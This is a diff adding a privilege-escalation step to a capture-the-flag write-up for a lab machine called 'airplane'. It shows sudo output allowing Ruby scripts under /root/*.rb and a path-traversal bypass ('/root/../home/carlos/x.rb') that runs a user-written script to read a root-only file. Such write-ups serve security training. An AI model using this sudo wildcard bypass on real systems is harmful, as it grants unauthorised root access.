@@ -58,5 +58,23 @@ uid=1001(hudson) gid=1001(hudson) euid=1000(carlos) groups=1001(hudson)
 
 Have access to hudson home folder create own ssh key get full ssh access as **carlos**
 
+### Priv Esc to root
+
+carlos@airplane:/usr/bin$ sudo -l
+Matching Defaults entries for carlos on airplane:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User carlos may run the following commands on airplane:
+    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
+
+**Folders /Root  and /usr/bin/ruby are ofcorse locked for write**
+ 
+ ### Wildcard Exploiting
+
+carlos@airplane:**/home/carlos/**$ echo "puts File.read('/root/root.txt')" > x.rb
+
+carlos@airplane:$ sudo /usr/bin/ruby **/root/../home/carlos/x.rb**
+
 
 </code>
